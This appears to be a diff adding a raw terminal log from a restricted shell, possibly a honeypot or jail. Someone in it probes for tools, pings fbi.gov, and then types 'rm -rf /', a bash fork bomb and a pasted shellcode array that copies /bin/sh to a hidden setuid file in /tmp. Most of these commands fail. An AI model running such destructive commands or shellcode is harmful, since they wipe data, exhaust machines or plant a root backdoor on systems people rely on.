@@ -1,0 +1,121 @@
+[4hAWSWeb:~# cd
+[4l[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# root[1D[1P[1D[1P[1D[1P[1D[1Psudo -s[1D[1Pi
+bash: sudo: command not found
+AWSWeb:~# what[1D[1P[1D[1P[1D[1P[1D[1Pecho 1
+[4l1
+[4hAWSWeb:~# tree
+bash: tree: command not found
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# help
+bash: help: command not found
+AWSWeb:~# help --[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Ph
+bash: h: command not found
+AWSWeb:~# s
+bash: s: command not found
+AWSWeb:~# ping
+[4lUsage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]
+            [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]
+            [-M mtu discovery hint] [-S sndbuf]
+            [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination
+[4hAWSWeb:~# ping g[1D[1Pfbi.gov
+[4lPING fbi.gov (19.176.146.205) 56(84) bytes of data.
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=1 ttl=50 time=44.9 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=2 ttl=50 time=43.8 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=3 ttl=50 time=48.9 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=4 ttl=50 time=50.0 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=5 ttl=50 time=48.8 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=6 ttl=50 time=40.8 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=7 ttl=50 time=44.9 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=8 ttl=50 time=40.2 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=9 ttl=50 time=46.8 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=10 ttl=50 time=41.5 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=11 ttl=50 time=44.3 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=12 ttl=50 time=42.7 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=13 ttl=50 time=42.4 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=14 ttl=50 time=44.6 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=15 ttl=50 time=49.0 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=16 ttl=50 time=49.5 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=17 ttl=50 time=41.3 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=18 ttl=50 time=47.2 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=19 ttl=50 time=42.7 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=20 ttl=50 time=43.7 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=21 ttl=50 time=41.4 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=22 ttl=50 time=42.9 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=23 ttl=50 time=44.8 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=24 ttl=50 time=49.6 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=25 ttl=50 time=42.5 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=26 ttl=50 time=47.0 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=27 ttl=50 time=50.0 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=28 ttl=50 time=48.7 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=29 ttl=50 time=42.8 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=30 ttl=50 time=48.2 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=31 ttl=50 time=47.1 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=32 ttl=50 time=48.7 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=33 ttl=50 time=47.2 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=34 ttl=50 time=43.0 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=35 ttl=50 time=48.5 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=36 ttl=50 time=46.4 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=37 ttl=50 time=43.2 ms
+64 bytes from fbi.gov (19.176.146.205): icmp_seq=38 ttl=50 time=44.7 ms
+--- fbi.gov ping statistics ---
+38 packets transmitted, 38 received, 0% packet loss, time 907ms
+rtt min/avg/max/mdev = 48.264/50.352/52.441/2.100 ms
+[4hAWSWeb:~# cowsay
+bash: cowsay: command not found
+AWSWeb:~# top
+bash: top: command not found
+AWSWeb:~# libao2
+bash: libao2: command not found
+AWSWeb:~# apache
+bash: apache: command not found
+AWSWeb:~# vsftp
+bash: vsftp: command not found
+AWSWeb:~# ap[1D[1P[1D[1Pwget
+[4lwget: missing URL
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+[4hAWSWeb:~# wget r[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Prm
+[4l[4hAWSWeb:~# rm -rf /
+[4l[4hAWSWeb:~# rm -r 
+[4l[4hAWSWeb:~# :(){:|:&};:
+bash: :(){:|:&}: command not found
+bash: :: command not found
+AWSWeb:~# perl
+bash: perl: command not found
+AWSWeb:~# :(){:|:&};:
+bash: :(){:|:&}: command not found
+bash: :: command not found
+AWSWeb:~# char esp[] __attribute__ ((section(".text"))) /* e.s.p
+bash: char: command not found
+AWSWeb:~# release */
+bash: release: command not found
+AWSWeb:~#                = "\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68"
+bash: \xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68: command not found
+AWSWeb:~#                  "\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99"
+bash: \xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99: command not found
+AWSWeb:~#                  "\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7"
+bash: \xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7: command not found
+AWSWeb:~#                  "\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56"
+bash: \x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56: command not found
+AWSWeb:~#                  "\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31"
+bash: \x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31: command not found
+AWSWeb:~#                  "\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69"
+bash: \xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69: command not found
+AWSWeb:~#                  "\x6e\x2f\x73\x68\x00\x2d\x63\x00"
+bash: \x6e\x2f\x73\x68\x00\x2d\x63\x00: command not found
+AWSWeb:~#                  "cp -p /bin/sh /tmp/.beyond; chmod 4755
+-bash: syntax error: unexpected end of file
+AWSWeb:~# /tmp/.beyond;";
+bash: /tmp/.beyond: command not found
+-bash: syntax error: unexpected end of file
+AWSWeb:~# python
+bash: python: command not found
+AWSWeb:~# 
+AWSWeb:~# quit
+bash: quit: command not found
+AWSWeb:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# [Kexit[4D[Kquit[4D[Kpython[6D[K/tmp/.beyond;";[15D[K                 "cp -p /bin/sh /tmp/.beyond; chmod 4755[56D[K                 "\x6e\x2f\x73\x68\x00\x2d\x63\x00"[51D[K                 "\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69"[67D[K                 "\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31"[67D[K                 "\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56"[67D[K                 "\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7"[67D[K                 "\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99"[67D[K               = "\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68"[67D[Krelease */[10D[Kchar esp[] __attribute__ ((section(".text"))) /* e.s.p[54D[K:(){:|:&};:[11D[Kchar esp[] __attribute__ ((section(".text"))) /* e.s.p[54D[K:(){:|:&};:[11D[Kperl[4D[K:(){:|:&};:[11D[Krm -r [6D[Krm -rf /[8D[Krm[2D[Kwget[4D[Kvsftp[5D[Kapache[6D[Klibao2[6D[Ktop[3D[Kcowsay[6D[Kping fbi.gov[12D[Kping[4D[Ks[1D[Kh[1D[Khelp[4D[Ktree[4D[Kecho 1[6D[Ksudo -i[7D[Kls[2D[Kcd[1D[1P[1D[1P
